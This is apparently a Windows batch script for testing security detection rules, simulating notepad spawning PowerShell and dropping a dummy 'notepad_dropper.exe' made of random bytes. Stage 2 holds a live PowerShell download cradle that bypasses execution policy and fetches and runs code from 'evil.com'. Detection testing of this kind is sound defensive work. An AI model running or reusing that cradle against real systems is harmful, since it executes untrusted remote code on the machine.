@echo off
REM Unusual spawn: notepad.exe -> powershell.exe with download cradle
set "PS_CMD=%windir%\Sysnative\WindowsPowerShell\v1.0\powershell.exe"
if not exist "%PS_CMD%" set "PS_CMD=powershell.exe"

echo ============================================
echo Simulation: Unusual Parent -> LOLBin Chain
echo ============================================
echo.

echo [*] Stage 1: Starting notepad (unusual parent process)
start /B notepad.exe
timeout /t 1 /nobreak >nul

echo [*] Stage 2: PowerShell spawned from notepad context with download cradle
"%PS_CMD%" -NoProfile -ExecutionPolicy Bypass -Command "Write-Host '[SIM] Unusual parent: notepad.exe -> powershell.exe'; Write-Host '[SIM] DownloadString from evil.com'; IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload')"

echo [*] Stage 3: Dropping payload
"%PS_CMD%" -NoProfile -ExecutionPolicy Bypass -Command "$bytes = [byte[]]::new(8192); $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create(); $rng.GetBytes($bytes); [System.IO.File]::WriteAllBytes(\"$env:PUBLIC\notepad_dropper.exe\", $bytes); Write-Host '[SIM] Payload dropped'"

echo.
echo ============================================
echo SIMULATION COMPLETE
echo ============================================
